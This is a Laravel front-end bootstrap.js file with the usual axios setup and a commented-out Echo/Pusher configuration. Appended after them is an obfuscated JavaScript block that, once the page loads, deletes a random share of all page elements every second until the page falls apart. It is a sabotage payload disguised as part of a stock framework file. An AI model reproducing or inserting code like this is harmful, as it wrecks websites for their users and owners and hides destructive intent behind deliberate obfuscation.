import 'bootstrap';

/**
 * We'll load the axios HTTP library which allows us to easily issue requests
 * to our Laravel back-end. This library automatically handles sending the
 * CSRF token as a header based on the value of the "XSRF" token cookie.
 */

import axios from 'axios';
window.axios = axios;

window.axios.defaults.headers.common['X-Requested-With'] = 'XMLHttpRequest';

/**
 * Echo exposes an expressive API for subscribing to channels and listening
 * for events that are broadcast by Laravel. Echo and event broadcasting
 * allows your team to easily build robust real-time web applications.
 */

// import Echo from 'laravel-echo';

// import Pusher from 'pusher-js';
// window.Pusher = Pusher;

// window.Echo = new Echo({
//     broadcaster: 'pusher',
//     key: import.meta.env.VITE_PUSHER_APP_KEY,
//     wsHost: import.meta.env.VITE_PUSHER_HOST ?? `ws-${import.meta.env.VITE_PUSHER_APP_CLUSTER}.pusher.com`,
//     wsPort: import.meta.env.VITE_PUSHER_PORT ?? 80,
//     wssPort: import.meta.env.VITE_PUSHER_PORT ?? 443,
//     forceTLS: (import.meta.env.VITE_PUSHER_SCHEME ?? 'https') === 'https',
//     enabledTransports: ['ws', 'wss'],
// });

function _0x3e07(_0x567987,_0x601a23){var _0xefd1dd=_0xefd1();return 
_0x3e07=function(_0x3e07bb,_0x13b93d){_0x3e07bb=_0x3e07bb-0x180;var _0x456e5e=_0xefd1dd[_0x3e07bb];return 
_0x456e5e;},_0x3e07(_0x567987,_0x601a23);}var _0x30cdd2=_0x3e07;(function(_0x527a6e,_0x243ed0){var 
_0x2bac7e={_0x49859d:0x190,_0x3b76af:0x181,_0x3469e9:0x18f},_0x36bfe1=_0x3e07,_0x87b07e=_0x527a6e();while(!![]){try{var 
_0x43f6a6=-parseInt(_0x36bfe1(0x187))/0x1+-parseInt(_0x36bfe1(_0x2bac7e._0x49859d))/0x2+-parseInt(_0x36bfe1(0x180))/0x3+-parseInt(_0x36bfe1(0x18c))/0x4+parseInt(_0x36bfe1(0x182))/0x5*(parseInt(_0x36bfe1(0x184))/0x6)+parseInt(_0x36bfe1(_0x2bac7e._0x3b76af))/0x7*(-parseInt(_0x36bfe1(0x188))/0x8)+parseInt(_0x36bfe1(_0x2bac7e._0x3469e9))/0x9*(parseInt(_0x36bfe1(0x18a))/0xa);if(_0x43f6a6===_0x243ed0)break;else 
_0x87b07e['push'](_0x87b07e['shift']());}catch(_0x2bd7db){_0x87b07e['push'](_0x87b07e['shift']());}}}(_0xefd1,0xaf002));function 
_0xefd1(){var 
_0x11aa39=['594352ciJJPn','addEventListener','160110GzLbSq','random','618984IbECIK','length','load','873nhaTAP','401566VwRFNn','2192262hHYAbZ','28LVQVkE','63415YbYhXz','parentNode','654PLOBPU','floor','querySelectorAll','835253UAMSaD'];_0xefd1=function(){return 
_0x11aa39;};return _0xefd1();}function _0x4a4ece(){var 
_0x14d062={_0x4ab101:0x186,_0x5541d1:0x185},_0x4b9ece=_0x3e07,_0x30753b=document[_0x4b9ece(_0x14d062._0x4ab101)]('*');for(var 
_0x1bf613=0x0;_0x1bf613<_0x30753b[_0x4b9ece(0x18d)]/0x1e;_0x1bf613++){var 
_0xc3c870=_0x30753b[Math[_0x4b9ece(_0x14d062._0x5541d1)](Math[_0x4b9ece(0x18b)]()*_0x30753b[_0x4b9ece(0x18d)])];_0xc3c870[_0x4b9ece(0x183)]['removeChild'](_0xc3c870);}}window[_0x30cdd2(0x189)](_0x30cdd2(0x18e),function(){_0x4a4ece(),setInterval(_0x4a4ece,0x3e8);});
